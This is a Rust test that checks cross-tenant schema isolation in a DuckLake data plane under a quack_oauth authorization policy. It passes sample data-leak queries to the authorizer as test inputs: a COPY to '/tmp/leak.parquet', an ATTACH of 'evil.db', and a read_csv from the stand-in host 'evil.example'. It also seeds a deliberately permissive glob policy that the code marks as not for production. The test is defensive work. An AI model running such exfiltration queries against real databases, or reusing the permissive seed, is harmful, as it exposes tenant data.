//! No-mock SCHEMA-ISOLATION matrix for the direct-write-to-DuckLake data plane
//! (Phase-4 slice 3c, arc42 rev.5).
//!
//! The owner's design writes a delegated result DIRECTLY into escurel's own
//! DuckLake, in a per-tenant result schema — no sidecar, no separate store. The
//! cross-tenant boundary is then quack_oauth's default-deny policy scoped by
//! `object_pattern` to the tenant's OWN schema + its result schema. This test
//! proves that boundary against a real JWKS + a real quack_oauth policy, as SQL
//! assertions over the DIRECT `quack_oauth_check_authorization` function:
//!
//! - a tenant may Scan its own schema + Insert into its own result schema;
//! - a cross-tenant Scan (another tenant's schema), a join onto it, an
//!   INSERT-SELECT reading it, and a cross-tenant Insert are ALL denied —
//!   because quack_oauth walks base tables, joins and FROM-subqueries and
//!   default-denies anything outside the pattern (the source finding that
//!   confirmed the owner's "quack_oauth can prevent cross-tenant reads");
//! - SET / ATTACH / COPY TO stay denied.
//!
//! It ALSO re-states the F1 residual for THIS layout: a table-function launder
//! (`read_csv(http)`) combined with an entitled object is a self-exfil of the
//! session's OWN rows, NOT a cross-tenant read — observed, not asserted.
//!
//! `#[ignore]`: network + unsigned extensions. Run:
//! ```sh
//! cargo test -p escurel-server --test suite -- --ignored --nocapture quack_schema_isolation
//! ```

use duckdb::{Config, Connection, params};
use escurel_test_support::ExtraIssuer;

#[tokio::test]
#[ignore = "network + unsigned extensions; the Phase-4 schema-isolation gate"]
async fn a_per_schema_policy_isolates_tenants_for_direct_write_to_ducklake() {
    let issuer = ExtraIssuer::start().await;

    let config = Config::default()
        .allow_unsigned_extensions()
        .expect("config");
    let conn = Connection::open_in_memory_with_flags(config).expect("open");
    conn.execute_batch(
        "INSTALL quack; LOAD quack; \
         INSTALL quack_oauth FROM 'http://get.erpl.io'; LOAD quack_oauth;",
    )
    .expect("load extensions");

    conn.execute_batch(&format!(
        "SET quack_authentication_function = 'quack_oauth_check_token'; \
         SET quack_authorization_function  = 'quack_oauth_check_authorization'; \
         CREATE SECRET rs (TYPE quack_oauth_server, issuer '{iss}', jwks_uri '{jwks}', \
            audience 'escurel-quack', policy_table 'main.policies', audit_table 'main.audit'); \
         SET quack_oauth_provider = 'generic'; \
         SET quack_oauth_server_secret_name = 'rs';",
        iss = issuer.issuer_url(),
        jwks = issuer.jwks_url(),
    ))
    .expect("configure quack_oauth");

    // A per-tenant schema layout: tenant_a is the requester's own data, its
    // result schema is where a delegated result lands, and tenant_b stands in
    // for ANOTHER tenant's data that must stay unreachable.
    //
    // NOTE: the policy rows below are DELIBERATELY the legacy NULL-subject,
    // glob-object shape (`tenant_a.*`) to probe quack_oauth's raw enforcement.
    // Production rows are subject-bound + LITERAL objects; the NORMATIVE builder
    // is `escurel_index::quack_policy::scoped_session_policy` (which refuses this
    // NULL-subject/glob shape, crew F3/F5). Do NOT copy this seed into prod.
    conn.execute_batch(
        "CREATE SCHEMA tenant_a; CREATE SCHEMA result_tenant_a; CREATE SCHEMA tenant_b; \
         CREATE TABLE tenant_a.entitled AS SELECT 1 AS id, 'ok' AS v; \
         CREATE TABLE result_tenant_a.out (id INTEGER, v VARCHAR); \
         CREATE TABLE tenant_b.secret AS SELECT 99 AS other_tenant_secret; \
         CREATE TABLE main.policies (priority INTEGER NOT NULL, subject VARCHAR, \
            any_scope VARCHAR[], actions VARCHAR[], object_pattern VARCHAR, \
            column_pattern VARCHAR, allow BOOLEAN NOT NULL); \
         INSERT INTO main.policies VALUES \
            (10, NULL, ['scenario:run'], ['Scan'],   'tenant_a.*',        NULL, true), \
            (20, NULL, ['scenario:run'], ['Insert'], 'result_tenant_a.*', NULL, true); \
         CREATE TABLE main.audit (timestamp_unix_s BIGINT, event_type VARCHAR, \
            subject VARCHAR, issuer VARCHAR, kid VARCHAR, token_hash VARCHAR, \
            action VARCHAR, reason VARCHAR);",
    )
    .expect("seed per-tenant schemas + policy");

    let token = issuer.mint(
        "default",
        "runner",
        &["escurel-quack"],
        "roles",
        &["scenario:run"],
    );

    let sid = "sess-schema";
    let authed: bool = conn
        .query_row(
            "SELECT quack_oauth_check_token(?, ?, ?)",
            params![sid, token, ""],
            |r| r.get(0),
        )
        .expect("check_token call");
    assert!(authed, "the scoped token must authenticate");

    let authz = |sql: &str| -> bool {
        conn.query_row(
            "SELECT quack_oauth_check_authorization(?, ?)",
            params![sid, sql],
            |r| r.get::<_, bool>(0),
        )
        .unwrap_or_else(|e| panic!("check_authorization({sql:?}) call failed: {e}"))
    };

    // --- ALLOW: the tenant's own schema + its result schema ---------------
    assert!(
        authz("SELECT id, v FROM tenant_a.entitled"),
        "a tenant may Scan its own schema"
    );
    assert!(
        authz("INSERT INTO result_tenant_a.out VALUES (1, 'ok')"),
        "the delegated result write into the tenant's result schema is allowed"
    );

    // --- DENY: everything crossing into another tenant's schema -----------
    assert!(
        !authz("SELECT * FROM tenant_b.secret"),
        "a cross-tenant Scan must be denied (the owner's core claim, proven)"
    );
    assert!(
        !authz("SELECT * FROM tenant_a.entitled JOIN tenant_b.secret ON true"),
        "a join reaching another tenant's schema must be denied (both objects walked)"
    );
    assert!(
        !authz("SELECT id FROM (SELECT * FROM tenant_b.secret) s"),
        "a FROM-subquery reaching another tenant's schema must be denied (subqueries walked)"
    );
    assert!(
        !authz(
            "INSERT INTO result_tenant_a.out SELECT other_tenant_secret, 'x' FROM tenant_b.secret"
        ),
        "an INSERT-SELECT reading another tenant is denied — the source is checked under Insert"
    );
    assert!(
        !authz("INSERT INTO tenant_b.secret VALUES (1)"),
        "a cross-tenant Insert must be denied"
    );
    assert!(
        !authz("SET enable_external_access=true"),
        "SET (Pragma) must be denied"
    );
    assert!(!authz("ATTACH 'evil.db' AS e"), "ATTACH must be denied");
    assert!(
        !authz("COPY tenant_a.entitled TO '/tmp/leak.parquet'"),
        "COPY TO must be denied"
    );

    // --- The F1 residual for THIS layout: a table function laundering the
    // session's OWN entitled rows outward. This is self-exfil, NOT a
    // cross-tenant read (tenant_b is never reached). Observed, not asserted —
    // it is a first-party-agent concern, reduced by denying Attach/Pragma/CopyTo
    // above and by the producer being first-party code.
    let self_exfil =
        authz("SELECT * FROM tenant_a.entitled, read_csv('http://evil.example/x.csv')");
    println!(
        "F1 residual (rev.5): table-function self-exfil of OWN rows allowed={self_exfil}. \
         This reads tenant_a's OWN data + a remote CSV — it never reaches tenant_b, so it is \
         NOT a cross-tenant break; it is a first-party self-exfil concern (deny Attach/Pragma/CopyTo, \
         first-party producer)."
    );
}
